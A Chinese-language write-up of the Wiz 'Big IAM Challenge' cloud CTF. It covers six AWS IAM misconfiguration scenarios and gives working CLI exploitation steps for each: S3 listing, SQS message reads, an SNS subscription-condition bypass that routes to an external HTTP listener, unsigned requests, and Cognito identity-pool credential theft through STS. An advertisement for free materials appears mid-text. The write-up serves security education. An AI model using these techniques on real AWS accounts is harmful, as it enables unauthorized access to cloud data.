wiz启动了一个名为“The Big IAM Challenge”云安全CTF挑战赛。旨在让白帽子识别和利用
IAM错误配置，并从现实场景中学习，从而更好的认识和了解IAM相关的风险。比赛包括6个场景，每个场景都专注于各种AWS服务中常见的IAM配置错误。

##### Challenge1:

 **Buckets of Fun**

We all know that public buckets are risky. But can you find the flag?

查看提示获取本关的IAM策略如下：

    
    
    {  
    "Version": "2012-10-17",  
    "Statement": [  
    {  
    "Effect": "Allow",   //Effect（效果）设置为Allow（允许）  
    "Principal": "*",    //Principal（主体）是所有用户（"*"）  
    "Action": "s3:GetObject",  //获取对象  
    "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"  //指定S3存储桶中的所有对象  
    },  
    {  
    "Effect": "Allow",  
    "Principal": "*",  
    "Action": "s3:ListBucket",    //列出存储桶  
    "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",    
    "Condition": {      //条件是通过前缀限制只能列出以"files/"为前缀的对象  
    "StringLike": {  
    "s3:prefix": "files/*"  
    }  
    }  
    }  
    ]  
    }

该策略允许任何用户列出"thebigiamchallenge-storage-9979f4b"存储桶中符合前缀条件"files/"的对象。该策略存在如下安全风险：

1、允许任何用户对指定的S3存储桶执行GetObject操作以获取对象的内容。

2、允许任何用户对指定的S3存储桶执行ListBucket操作列出存储桶中符合指定前缀条件的对象

 **解题思路：**

针对s3存储桶权限校验不严格，列出桶资源对象并使用查看对象内容获取flag。

1、获取该存储桶中的对象

    
    
    aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/

得知files目录下存在flag1.txt文件，将其下载到本地，这里提示Read-only file
system（只读文件系统）错误，权限问题，我们将其下载到/tmp目录下：

    
    
    aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag.txt

另外也可以直接网络访问获取：

    
    
    http://s3.amazonaws.com/thebigiamchallenge-storage-9979f4b/files/flag1.txt

获得flag如下：

    
    
    {wiz:exposed-storage-risky-as-usual}

![challenge1](https://image.3001.net/images/20230630/1688086193_649e26b12c3756f823a2a.png!small)

##### Challenge2:

We created our own analytics system specifically for this challenge. We think
it's so good that we even used it on this page. What could go wrong?

Join our queue and get the secret flag.

查看提示获取本关的IAM策略如下：

    
    
    {  
    "Version": "2012-10-17",  
    "Statement": [  
    {  
    "Effect": "Allow",  
    "Principal": "*",  
    "Action": [  
    "sqs:SendMessage",      //发送消息  
    "sqs:ReceiveMessage"        //接收消息  
    ],  
    "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"  
    }  
    ]  
    }

该IAM策略允许任何用户对特定的SQS队列执行SendMessage和ReceiveMessage操作，即发送和接收消息。该策略存在如下安全风险：

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

1、该策略将操作权限授予了所有用户（"*"），意味着任何具有该策略的用户或角色都可以发送和接收消息。

2、该策略没有限制允许访问的用户、角色或其他条件。它允许所有用户执行SendMessage和ReceiveMessage操作。

 **解题思路：**

针对授予特定SQS队列执行ReceiveMessage操作获取队列消息来查找flag。

1、接受消息队列中的信息

    
    
    aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2

![challenge2](https://image.3001.net/images/20230630/1688086195_649e26b33e148247f5d14.png!small)

2、获取html文件内容

    
    
    https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html

![challenge2-1](https://image.3001.net/images/20230630/1688086197_649e26b5130efd6434c08.png!small)

获得flag如下：

    
    
    {wiz:you-are-at-the-front-of-the-queue} 

##### Challenge3:

 **Enable Push Notifications**

We got a message for you. Can you get it?

查看提示并获取本关的IAM策略如下：

    
    
    {  
    "Version": "2008-10-17",  
    "Id": "Statement1",  
    "Statement": [  
    {  
    "Sid": "Statement1",  
    "Effect": "Allow",  
    "Principal": {  
    "AWS": "*"                                      //允许任何AWS用户  
    },  
    "Action": "SNS:Subscribe",       //订阅操作  
    "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",    //主题ARN  
    "Condition": {  
    "StringLike": {  
    "sns:Endpoint": "*@tbic.wiz.io"  //订阅条件   
    }  
    }  
    }  
    ]  
    }

该策略允许任何AWS用户对指定的SNS主题（ARN为"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications"）进行订阅操作。订阅条件要求订阅者的Endpoint必须以"*@tbic.wiz.io"结尾。该策略存在如下风险：

  1. 全局访问权限：该策略中指定了允许任何AWS用户（"*"）执行SNS订阅操作。这意味着任何具有有效的AWS凭证的用户都可以订阅该SNS主题。如果此策略不是有意为特定用户或实体设计的，可能存在风险，因为未经授权的用户可以执行订阅操作。

  2. 通配符条件：该策略中的条件指定订阅者的Endpoint必须以"*@tbic.wiz.io"结尾。然而，通配符条件可能过于宽松，允许任何以该域名结尾的Endpoint进行订阅，包括未经授权的Endpoint。这可能导致未经授权的实体订阅主题并接收敏感信息或滥用SNS服务。

  3. 潜在的信息泄露：由于该策略允许任何人订阅主题，如果主题包含敏感信息或重要通知，可能会导致信息泄露的风险。攻击者可以订阅主题并接收敏感信息，甚至利用该信息进行其他恶意行为。

 **解题思路：**

1、订阅SNS主题

在订阅时由于调阅条件的限制，先尝试将订阅消息发送到email邮箱账号，但是由于我们没有以@tbic.wiz.io为后缀的邮箱账号，因此需要对此处进行绕过。

AWS用户可以使用SNS:Subscribe操作订阅指定的SNS主题：

    
    
    aws sns subscribe --topic-arn <主题ARN> --protocol <协议> --notification-endpoint <订阅者Endpoint>

<主题ARN>为实际的SNS主题ARN。所使用的协议有HTTP、HTTPS、Email、SMS等，订阅者的Endpoint具体根据策略中的条件要求。

对该题目设置SNS订阅：

    
    
    aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint research@tbic.wiz.io

![challenge3-1](https://image.3001.net/images/20230630/1688086198_649e26b68a4b819a0461b.png!small)

2、订阅条件限制绕过

尝试使用http协议进行代理监听的方式获取订阅消息：

    
    
    aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://43.155.79.163:8443/@tbic.wiz.io

![challenge3-2](https://image.3001.net/images/20230630/1688086201_649e26b9aa4fc0a5c6e98.png!small)

接收到来自sns的订阅确认，消息提示点击SubscribeURL确认订阅消息，等待一会即可接收到附带flag的订阅消息：

![challenge3-3](https://image.3001.net/images/20230630/1688086205_649e26bd0d4158ea6e9eb.png!small)

获取到flag如下：

    
    
    {wiz:always-suspect-asterisks}

##### Challenge4:

 **Admin only?**

We learned from our mistakes from the past. Now our bucket only allows access
to one specific admin user. Or does it?

查看提示并获取本关的IAM策略如下：

    
    
    {  
    "Version": "2012-10-17",  
    "Statement": [  
    {  
    "Effect": "Allow",  
    "Principal": "*",  
    "Action": "s3:GetObject",  
    "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"  
    },  
    {  
    "Effect": "Allow",  
    "Principal": "*",  
    "Action": "s3:ListBucket",  
    "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",  
    "Condition": {  
    "StringLike": {  
    "s3:prefix": "files/*"  
    },  
    "ForAllValues:StringLike": {  
    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"  
    }  
    }  
    }  
    ]  
    }

该策略用于定义对 Amazon S3 存储桶的访问权限。其中包含了两个声明（Statement）：

1、声明一允许任何用户存储桶执行GetObject操作，访问thebigiamchallenge-admin-storage-abf1321的s3储存桶资源。

2、声明二允许任何用户对S3存储桶执行ListBucket操作，列出存储桶中的对象。该声明有一个约束条件限制请求中的后缀必须以"files/"
开头，并且访问资源的主体是arn:aws:iam::133713371337:user/admin。

 **解题思路：**

看到声明二中限制的访问资源主体是arn:aws:iam::133713371337:user/admin，便想着如何获取到该用户的凭据，然而在目前的环境中翻遍了各种配置文件和脚本文件都未发现相关凭据泄露，且当下凭据不能用于该访问主体。随后转变思路利用GetObject操作无限制进行目录Fuzz，Fuzz出如下路径：

    
    
    /thebigiamchallenge-admin-storage-abf1321/files/    
    /thebigiamchallenge-admin-storage-abf1321/files/cache/  
    /thebigiamchallenge-admin-storage-abf1321/files/tmp/  
    https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt

然后再深一次Fuzz，仍无flag相关结果，最终经瑞幸楼少提醒，发现了如下参数的妙用：

    
    
    --no-sign-request

该参数可以用来执行无需身份验证的请求。使用该参数可以跳过对请求进行签名和身份验证的步骤，从而可以在某些情况下执行不需要验证的操作。

    
    
    aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request  
    aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag4.txt

![challenge4-1](https://image.3001.net/images/20230630/1688086207_649e26bfeb3f8438cece0.png!small)

获得flag如下：

    
    
    {wiz:principal-arn-is-not-what-you-think}

##### Challenge5:

 **Do I know you?**

We configured AWS Cognito as our main identity provider. Let's hope we didn't
make any mistakes.

查看提示并获取本关的IAM策略如下：

    
    
    {  
    "Version": "2012-10-17",  
    "Statement": [  
    {  
    "Sid": "VisualEditor0",  
    "Effect": "Allow",  
    "Action": [  
    "mobileanalytics:PutEvents",  
    "cognito-sync:*"  
    ],  
    "Resource": "*"  
    },  
    {  
    "Sid": "VisualEditor1",  
    "Effect": "Allow",  
    "Action": [  
    "s3:GetObject",  
    "s3:ListBucket"  
    ],  
    "Resource": [  
    "arn:aws:s3:::wiz-privatefiles",  
    "arn:aws:s3:::wiz-privatefiles/*"  
    ]  
    }  
    ]  
    }  
    ​  
    ​  
    https://wiz-privatefiles.s3.amazonaws.com/  
    https://s3.amazonaws.com/wiz-privatefiles/  
    ​  
    ​  
    https://wiz-privatefiles.s3.amazonaws.com/soap/

如上策略有两个声明，VisualEditor0声明允许向MobileAnalytics服务发送事件数据以及对Cognito
Sync服务执行任何操作，且对这两个服务中的所有资源都可以操作。VisualEditor1声明允许执行GetObject和ListBucket两个操作，来获取wiz-privatefiles存储桶中的对象并列出存储桶中的内容。

 **解题思路：**

根据题目提示得知AWS Cognito服务为主要身份提供商，问题大概率出现在此处，通过搜索AWS Cognito配置错误看到一篇文章：

    
    
    https://www.wangan.com/p/7fy7f8abba5c0234        //通过错误配置的AWS Cognito接管AWS帐户

结合该思路我们首先需要获取到该AWS Cognito服务的identity_pool_id：

![challenge5-1](https://image.3001.net/images/20230630/1688086211_649e26c376c9a7a478112.png!small)

梳理下常见的获取identity_pool_id方法：

1、通过应用程序代码查找使用Cognito的部分，并寻找可能存在identity_pool_id的位置，通常在一些JS文件或者接口中可能存在。

2、通过监控分析网络流量分析捕获应用程序与Cognito之间的通信。在捕获的网络流量中，搜索包含 `identity_pool_id`的请求或响应。

3、通过搜寻查找一些配置文件或环境变量及启动脚本等获取Cognito相关的配置信息。

4、通过分析应用程序日志，查找 `identity_pool_id`的信息。有时日志文件会记录与身份池相关的操作或配置。

5、通过aws控制台或CLI命令行获取identity_pool_id，前提是需要有一定权限。

结合文章思路在前端页面获取到IdentityPoolId：

    
    
    AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});

![challenge5-2](https://image.3001.net/images/20230630/1688086213_649e26c5595d1083dd8df.png!small)

获取到identity_pool_id通过脚本再获取AK密钥进行配置：

![challenge5-3](https://image.3001.net/images/20230630/1688086215_649e26c73f0e331e8f9e4.png!small)

由于当前云终端权限限制的问题，改用本地进行配置及后续操作：

    
    
    aws configure  
    aws configure set aws_access_key_id   
    aws configure set aws_secret_access_key   
    aws configure set aws_session_token ""

![challenge5-4](https://image.3001.net/images/20230630/1688086217_649e26c97011aa4a35221.png!small)

获取到Flag如下：

    
    
    {wiz:incognito-is-always-suspicious}

##### Challenge6:

 **One final push**

Anonymous access no more. Let's see what can you do now.

Now try it with the authenticated role:
arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

查看提示并获取本关的IAM策略如下：

    
    
    {  
    "Version": "2012-10-17",  
    "Statement": [  
    {  
    "Effect": "Allow",  
    "Principal": {  
    "Federated": "cognito-identity.amazonaws.com"  
    },  
    "Action": "sts:AssumeRoleWithWebIdentity",       
    "Condition": {  
    "StringEquals": {  
    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"  
    }  
    }  
    }  
    ]  
    }

该策略用于定义IAM角色的信任关系，当cognito-identity身份服务进行Web身份验证时，可以使用STS的AssumeRoleWithWebIdentity操作请求临时凭证进行验证身份。此操作将验证来自cognito-identity身份服务的用户身份，并根据策略规定的条件和权限，为该用户生成一组临时凭证。这些临时凭证具有一定的时效性，可用于对 AWS 资源进行访问。

 **解题思路：**

题目中提示不再有匿名访问且需要使用身份aws:iam::092297851374:role/Cognito_s3accessAuth_Role进行操作，策略信息也指明了cognito-identity验证中的aud必须是identity_pool_id为us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b。思路如下：

1、获取身份标识符identity-id

    
    
    aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"

2、获取对应身份标识的令牌token

    
    
    aws cognito-identity get-open-id-token --identity-id 获取到的identity-id

3、使用获取到的身份验证令牌指定目标角色来获取临时访问凭证

    
    
    aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name 自定义session名称 --web-identity-token 获取到的token令牌

![challenge6-1](https://image.3001.net/images/20230630/1688086220_649e26cc921c0584e1145.png!small)

4、根据获取到的AK密钥配置并获取flag

    
    
    aws s3 ls  
    aws s3 ls s3://wiz-privatefiles-x1000  
    aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
![challenge6-2](https://image.3001.net/images/20230630/1688086222_649e26ce7bd17f3e9e051.png!small)

获取到flag如下：

    
    
    {wiz:open-sesame-or-shell-i-say-openid}

###  **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

